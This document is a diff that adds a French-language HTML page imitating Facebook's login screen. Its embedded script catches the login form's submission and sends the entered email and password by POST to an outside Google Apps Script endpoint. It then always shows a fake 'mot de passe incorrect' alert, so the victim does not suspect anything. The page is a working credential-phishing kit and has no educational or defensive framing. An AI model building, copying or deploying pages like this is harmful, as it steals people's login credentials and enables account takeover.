@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="C:\Users\USER\OneDrive\Bureau\fb.css">
+    <title>Facebook - Connexion ou inscription</title>  
+    <link rel="icon" type="image/x-icon" href="https://cdn.icon-icons.com/icons2/2429/PNG/512/facebook_logo_icon_147291.png">
+</head>
+
+<header>
+    <img src="C:\Users\USER\OneDrive\Bureau\back.png" class="backbtn">
+    <p class="language">Français (France)</p>
+</header>
+
+<body>
+    <div class="container">
+        <img src="C:\Users\USER\OneDrive\Bureau\facebook-logo.png" alt="Facebook.png" class="logo">
+    </div>
+
+    <div class="login-container">
+        <form id="loginForm">
+            <input type="email" class="facebook-input" name="email" placeholder="Adresse e-mail ou numéro de tél." required>
+            <input type="password" class="facebook-input" name="password" placeholder="Mot de passe" required>
+            <button type="submit" class="login-btn">Se connecter</button>
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        </form>
+    </div>
+	
+	
+	
+	
+	
+	
+	 <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzYlBveMzoSdF2KGHb1xPa8gpKrMSuw6iz6g_R6AxmfHVITVhMgLxRBI5fpj1YSJdHAWw/exec';
+            const form = document.getElementById('loginForm');
+
+            form.addEventListener('submit', e => {
+                e.preventDefault(); // Prevent the default form submission
+                fetch(scriptURL, { 
+                    method: 'POST',
+                    body: new FormData(form)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    alert('mot de passe incorrect'); // Show the message
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('mot de passe incorrect'); // Show the message on error as well
+                });
+            });
+        });
+    </script>
+</body>
+</html>
